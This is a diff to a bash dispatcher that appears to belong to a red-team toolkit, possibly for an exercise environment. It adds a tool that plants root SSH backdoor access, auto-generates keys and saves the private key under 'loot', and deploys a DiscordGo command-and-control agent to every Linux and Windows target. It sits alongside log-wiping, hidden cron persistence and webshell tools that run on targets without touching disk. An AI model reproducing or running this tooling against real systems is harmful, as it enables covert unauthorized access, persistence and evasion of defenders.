@@ -23,6 +23,7 @@
 #   -h, --help               Show this help
 #
 # ── REMOTE tools (piped to target, never written to disk) ──────────────────────
+#   root-ssh              install|remove|status  [--key "ssh-ed25519 ..."] [--pass PASSWORD]
 #   shadow-crond          install|remove|status
 #   nuke-journal          install|remove|status|wipe
 #   ureadahead-persist    install|remove|status [--key "ssh-ed25519 ..."]
@@ -52,6 +53,7 @@
 #   ad-persist       <target_ip> <domain_admin> <pass>
 #   lamp-shell       [options]   (targets svc-samba-01 over HTTP/SMB)
 #   nginx-flask      [options]   (targets svc-redis-01 over HTTP)
+#   discordgo-deploy [options]   (drop DiscordGo agent to all Linux + Windows targets)
 # ──────────────────────────────────────────────────────────────────────────────
 
 set -euo pipefail
@@ -73,6 +75,7 @@ hdr()   { echo -e "\n${CYAN}── $* ──${NC}"; }
 
 declare -A TOOLS=(
     # remote — need root on target
+    [root-ssh]="REMOTE:root-ssh.sh"
     [shadow-crond]="REMOTE:shadow-crond.sh"
     [nuke-journal]="REMOTE:nuke-journal.sh"
     [ureadahead-persist]="REMOTE:ureadahead-persist.sh"
@@ -102,6 +105,7 @@ declare -A TOOLS=(
     [ad-persist]="LOCAL:persist/ad_persist.sh"
     [lamp-shell]="LOCAL:webshells/deploy_lamp_shell.sh"
     [nginx-flask]="LOCAL:webshells/deploy_nginx_flask_shell.sh"
+    [discordgo-deploy]="LOCAL:DiscordGo/deploy-discordgo.sh"
 )
 
 # ── argument parsing ──────────────────────────────────────────────────────────
@@ -178,7 +182,18 @@ fi
 # ── local tools: just run them ────────────────────────────────────────────────
 if [[ "$MODE" == "LOCAL" ]]; then
     info "Running locally: $SCRIPT ${TOOL_ARGS[*]+"${TOOL_ARGS[*]}"}"
-    exec bash "$SCRIPT" "${TOOL_ARGS[@]+"${TOOL_ARGS[@]}"}"
+    # Flags like -p/-S/-i are recognized by rt-ssh.sh's parser and consumed into
+    # variables regardless of whether they appear before or after the tool name.
+    # Forward everything parsed so LOCAL tools (which manage their own SSH) get them.
+    LOCAL_OPTS=()
+    [[ -n "$TARGET"         ]] && LOCAL_OPTS+=(--target "$TARGET")
+    [[ -n "$SSH_PASS"       ]] && LOCAL_OPTS+=(-p "$SSH_PASS")
+    [[ -n "$SSH_KEY"        ]] && LOCAL_OPTS+=(-i "$SSH_KEY")
+    [[ "$SSH_PORT" != "22"  ]] && LOCAL_OPTS+=(-P "$SSH_PORT")
+    [[ -n "$SUDO_PASS"      ]] && LOCAL_OPTS+=(-S "$SUDO_PASS")
+    [[ $USE_SUDO   -eq 0    ]] && LOCAL_OPTS+=(--no-sudo)
+    [[ $VERBOSE    -eq 1    ]] && LOCAL_OPTS+=(-v)
+    exec bash "$SCRIPT" "${LOCAL_OPTS[@]}" "${TOOL_ARGS[@]+"${TOOL_ARGS[@]}"}"
 fi
 
 # ── remote tools: need a target ───────────────────────────────────────────────
@@ -211,6 +226,22 @@ fi
 
 # ── base64-encode the script (avoids quoting issues, no file on disk) ─────────
 B64=$(base64 -w0 < "$SCRIPT")
+
+# ── root-ssh install: auto-generate an ed25519 keypair if --key not supplied ──
+if [[ "$TOOL" == "root-ssh" && "${TOOL_ARGS[0]:-}" == "install" ]]; then
+    if ! printf '%s\n' "${TOOL_ARGS[@]}" | grep -qx -- '--key'; then
+        _TMP_KEY=$(mktemp /dev/shm/.rt-keygen-XXXXXXXX)
+        ssh-keygen -t ed25519 -f "$_TMP_KEY" -N "" -q -C "rt-root-ssh"
+        _RT_PUBKEY=$(cat "${_TMP_KEY}.pub")
+        rm -f "${_TMP_KEY}.pub"
+        mkdir -p "${RT_DIR}/loot"
+        _RT_KEYFILE="${RT_DIR}/loot/root-ssh_${TARGET//[@:.]/_}_ed25519"
+        mv "$_TMP_KEY" "$_RT_KEYFILE"
+        chmod 600 "$_RT_KEYFILE"
+        TOOL_ARGS+=(--key "$_RT_PUBKEY")
+        info "Generated keypair → ${_RT_KEYFILE}"
+    fi
+fi
 
 # ── build the remote command ──────────────────────────────────────────────────
 # Steps on target:
